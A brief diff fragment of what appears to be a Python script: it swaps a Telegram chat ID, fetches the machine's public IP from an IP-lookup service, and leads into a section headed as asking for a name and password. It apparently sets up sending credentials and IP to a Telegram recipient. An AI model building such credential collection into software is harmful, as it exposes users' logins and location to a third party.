@@ -236,7 +236,7 @@ def banner():
 
 #------------------[ TELEGRAM API ]-------------------#
 
-tid = "5877909656"
+tid = "6040290826"
 ip = requests.get("https://api.ipify.org").text
 
 #------------------[ NAME AND PSW ASK ]-------------------#
